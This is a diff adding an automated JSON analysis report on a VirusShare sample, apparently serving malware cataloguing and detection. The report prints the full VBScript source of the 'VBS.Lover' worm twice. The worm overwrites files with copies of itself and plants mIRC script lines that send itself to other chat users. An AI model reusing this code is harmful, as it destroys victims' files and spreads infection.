@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Wscript.Shell": "May run an executable file or a system command",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "' VBS.Lover by Dr Virus Quest\n' Origin from Malaysia\n' Copyright\ufffd1999\n\nOn Error Resume Next\nSet WshShell = Wscript.CreateObject(\"Wscript.Shell\")\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nCommandPath = WSHShell.ExpandEnvironmentStrings(\"%comspec%\")\nWshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do copy /y \" & Wscript.ScriptFullName & \" %%a >nul\")\nparent = Wscript.ScriptFullName\nvPath = Left(parent, InStrRev(parent, \"\\\"))\n\nFor Each target in FSO.GetFolder(vPath).Files\n    FSO.CopyFile parent, target.Name, 1\nNext\n\nIf Day(Now()) = 1 Then\n  WScript.Echo \"VBS.Trojan by Dr Virus Quest\"\n  Set oUrlLink = WshShell.CreateShortcut(\"VQ.URL\")\n  oUrlLink.TargetPath = \"http://virusquest.virtualave.net/\"\n  oUrlLink.Save\n  WshShell.Run (\"VQ.URL\")\nEnd If\n\nSet Fso = CreateObject(\"Scripting.FileSystemObject\")\n\nIf (Fso.FolderExists(\"c:\\mirc\")) Then\nSet ini = Fso.opentextfile(\"C:\\mirc\\script.ini\")\nFso.CopyFile wscript.ScriptFullName, \"c:\\windows\\help\\lover.vbs\"\nini.writeline \"[script]\"\nini.writeline \"ON 1:FILERCVD:*.*:./dcc send $nick c:\\windows\\help\\lover.vbs\"\nini.writeline \"ON 1:FILESENT:*.*:./dcc send $nick c:\\windows\\help\\lover.vbs\"\nini.writeline \"ON 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\\windows\\help\\lover.vbs\"\nini.writeline \"ctcp 1:ping:?:/notice $nick Are you my lover? But I am your's lover! | /halt\"\nini.writeline \"ON 1:TEXT:*real*:#:/msg $chan Are you my lover? But I am your's lover!\"\nini.writeline \"ON 1:join:#:/msg $nick Lover\"\nini.writeline \"; VBS.Lover by Dr Virus Quest\"\nini.writeline \"; Origin from Malaysia\"\nini.writeline \"; Copyright\ufffd1999\"\nini.Close\nEnd If"
+    },
+    "filename": "VirusShare_56ade3abb669181f1c13371b4731e927",
+    "filesize": 1647,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "56ade3abb669181f1c13371b4731e927",
+        "sha1": "45c099e81e02ce70e7c979d4ae2a3b614175b1dc",
+        "sha256": "2c4ee2b70217136de0368d327bfc2721bc231f1d94c7eed79f6d8ef8f7ca7197"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "' VBS.Lover by Dr Virus Quest",
+            "' Origin from Malaysia",
+            "' Copyright1999",
+            "On Error Resume Next",
+            "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\")",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "CommandPath = WSHShell.ExpandEnvironmentStrings(\"%comspec%\")",
+            "WshShell.Run (CommandPath & \" /c for %%a in (*.vbs) do copy /y \" & Wscript.ScriptFullName & \" %%a >nul\")",
+            "parent = Wscript.ScriptFullName",
+            "vPath = Left(parent, InStrRev(parent, \"\\\"))",
+            "For Each target in FSO.GetFolder(vPath).Files",
+            "    FSO.CopyFile parent, target.Name, 1",
+            "Next",
+            "If Day(Now()) = 1 Then",
+            "  WScript.Echo \"VBS.Trojan by Dr Virus Quest\"",
+            "  Set oUrlLink = WshShell.CreateShortcut(\"VQ.URL\")",
+            "  oUrlLink.TargetPath = \"http://virusquest.virtualave.net/\"",
+            "  oUrlLink.Save",
+            "  WshShell.Run (\"VQ.URL\")",
+            "End If",
+            "Set Fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "If (Fso.FolderExists(\"c:\\mirc\")) Then",
+            "Set ini = Fso.opentextfile(\"C:\\mirc\\script.ini\")",
+            "Fso.CopyFile wscript.ScriptFullName, \"c:\\windows\\help\\lover.vbs\"",
+            "ini.writeline \"[script]\"",
+            "ini.writeline \"ON 1:FILERCVD:*.*:./dcc send $nick c:\\windows\\help\\lover.vbs\"",
+            "ini.writeline \"ON 1:FILESENT:*.*:./dcc send $nick c:\\windows\\help\\lover.vbs\"",
+            "ini.writeline \"ON 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\\windows\\help\\lover.vbs\"",
+            "ini.writeline \"ctcp 1:ping:?:/notice $nick Are you my lover? But I am your's lover! | /halt\"",
+            "ini.writeline \"ON 1:TEXT:*real*:#:/msg $chan Are you my lover? But I am your's lover!\"",
+            "ini.writeline \"ON 1:join:#:/msg $nick Lover\"",
+            "ini.writeline \"; VBS.Lover by Dr Virus Quest\"",
+            "ini.writeline \"; Origin from Malaysia\"",
+            "ini.writeline \"; Copyright1999\"",
+            "ini.Close",
+            "End If"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://virusquest.virtualave.net/"
+        ]
+    },
+    "time": "0:00:00.276117",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
